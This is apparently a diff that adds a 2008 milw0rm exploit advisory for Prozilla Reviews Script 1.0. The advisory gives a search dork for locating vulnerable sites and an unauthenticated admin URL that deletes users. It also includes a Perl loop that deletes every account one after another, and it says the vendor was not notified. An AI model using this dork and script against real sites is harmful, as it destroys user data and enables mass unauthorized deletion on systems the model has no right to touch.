@@ -1,0 +1,52 @@
+--==+================================================================================+==--
+--==+          Prozilla Reviews Script 1.0 Arbitrary Delete User Vulnerability	     +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 7 April 2008
+Script Download: http://prozilla.net
+DORK: inurl:"view.php?ItemID=" rating "rate this review"
+
+Vendor Has Not Been Notified!
+
+
+
+DESCRIPTION:
+Prozilla Reviews script suffers from bad session handling, and some crutial parts of the admin area
+are not checked to see if the user is a admin or not.
+the below url will delete a user from the database. 
+
+
+
+Vulnerability:
+http://site.com/siteadmin/DeleteUser.php?UserID=[uid]
+
+
+
+NOTE/TIP:
+replace [uid] with a actualy user id.
+
+you can also code a little script to delete all users, example below.
+
+#!/usr/bin/perl
+
+use LWP::Simple;
+$i=1;
+while(1) {
+	$c=get("http://site.com/siteadmin/DeleteUser.php?UserID=".$i);
+	$i++;
+}
+#end
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+--==+================================================================================+==--
+--==+          Prozilla Reviews Script 1.0 Arbitrary Delete User Vulnerability	     +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-06]
